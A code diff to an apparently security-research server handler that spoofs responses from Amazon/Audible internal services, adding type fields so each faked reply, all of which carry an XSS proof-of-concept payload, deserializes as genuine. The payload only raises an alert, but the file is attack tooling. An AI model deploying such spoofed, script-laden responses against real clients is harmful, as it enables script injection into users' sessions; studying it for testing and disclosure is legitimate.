@@ -27,43 +27,70 @@ exports.handler = async (event) => {
   const XSS = '<img src=x onerror="alert(document.domain)">';
 
   let response;
+  let responseType;
 
   // Route based on Coral operation header
-  if (target.includes('getPrices') || target.includes('PriceAggregator')) {
+  // target format: com.amazon.<ServiceName>.<ServiceName>.<operationName>
+  if (target.includes('getPrices')) {
     response = getPricesResponse(XSS);
+    responseType = 'com.amazon.audiblepriceaggregatorservice#getPricesResponse';
   } else if (target.includes('saleDetailsByTag')) {
     response = saleDetailsByTagResponse(XSS);
-  } else if (target.includes('getMemberships') || target.includes('MembershipInformation')) {
+    responseType = 'com.amazon.audiblepriceaggregatorservice#saleDetailsByTagResponse';
+  } else if (target.includes('getMemberships')) {
     response = getMembershipsResponse(XSS);
+    responseType = 'com.amazon.audiblemembershipinformationservice#UserMembershipPlanListResult';
   } else if (target.includes('getCreditSummary')) {
     response = getCreditSummaryResponse(XSS);
-  } else if (target.includes('GetMembershipPlanDetails') || target.includes('MembershipDataServiceV2')) {
+    responseType = 'com.amazon.audiblemembershipinformationservice#CreditSummaryResult';
+  } else if (target.includes('GetMembershipPlanDetails')) {
     response = getMembershipPlanDetailsResponse(XSS);
-  } else if (target.includes('GetCustomerStatus') || target.includes('AccountData')) {
+    responseType = 'com.amazon.audibleapimembershipdataservice.v2#GetMembershipPlanDetailsResponse';
+  } else if (target.includes('GetCustomerStatus')) {
     response = getCustomerStatusResponse(XSS);
+    responseType = 'com.amazon.audibleapiaccountdataservice#GetCustomerStatusResponse';
   } else if (target.includes('GetCustomerInformation')) {
     response = getCustomerInformationResponse(XSS);
-  } else if (target.includes('getWidgets') || target.includes('RecommenderStrategy')) {
+    responseType = 'com.amazon.audibleapiaccountdataservice#GetCustomerInformationResponse';
+  } else if (target.includes('getWidgets')) {
     response = getWidgetsResponse(XSS);
-  } else if (target.includes('findExtraCreditOffers') || target.includes('SaleEligibility')) {
+    responseType = 'com.amazon.recommenderstrategyservice#WidgetsResponse';
+  } else if (target.includes('findExtraCreditOffers')) {
     response = findExtraCreditOffersResponse(XSS);
-  } else if (target.includes('GetCustomerIdMapping') || target.includes('CustomerAttribute')) {
+    responseType = 'com.amazon.audiblesaleeligibilityandofferservice#ExtraCreditOffersResponse';
+  } else if (target.includes('GetCustomerIdMapping')) {
     response = getCustomerIdMappingResponse(XSS);
+    responseType = 'com.amazon.audiblecustomerattributeservice#GetCustomerIdMappingResponse';
   } else if (target.includes('GetCOR')) {
     response = getCORResponse(XSS);
-  } else if (target.includes('GetDynamicPages') || target.includes('DynamicRanking')) {
+    responseType = 'com.amazon.audiblecustomerattributeservice#GetCORResponse';
+  } else if (target.includes('GetDynamicPages')) {
     response = getDynamicPagesResponse(XSS);
-  } else if (target.includes('GetProducts') || target.includes('CatalogData')) {
+    responseType = 'com.amazon.audibledynamicrankingservice#GetDynamicPagesResponse';
+  } else if (target.includes('GetProducts')) {
     response = getProductsResponse(XSS);
-  } else if (target.includes('getCartCount') || target.includes('CartService')) {
+    responseType = 'com.amazon.audibleapicatalogdataservice#GetProductsResponse';
+  } else if (target.includes('getCartCount')) {
     response = getCartCountResponse(XSS);
-  } else if (target.includes('getCustomerNotifications') || target.includes('CustomerOnboarding')) {
+    responseType = 'com.amazon.audiblecartservice#getCartCountResponse';
+  } else if (target.includes('getCustomerNotifications')) {
     response = getCustomerNotificationsResponse(XSS);
-  } else if (target.includes('GetIPInfo') || target.includes('IPLocationScout')) {
+    responseType = 'com.amazon.audiblecustomeronboardingservice#GetCustomerNotificationsResponse';
+  } else if (target.includes('GetIPInfo')) {
     response = getIPInfoResponse(XSS);
+    responseType = 'com.amazon.iplocationscoutservice#GetIPInfoResponse';
   } else {
+    // For unknown operations, try to derive the type from the target header
+    // Format: com.amazon.ServiceName.ServiceName.operationName
+    const parts = target.split('.');
+    const opName = parts[parts.length - 1] || 'unknown';
+    const namespace = parts.slice(0, -1).join('.').toLowerCase() || 'com.amazon.generic';
+    responseType = namespace + '#' + opName + 'Response';
     response = genericResponse(XSS, target);
   }
+
+  // Add __type to response for Coral deserialization
+  response.__type = responseType;
 
   return {
     statusCode: 200,
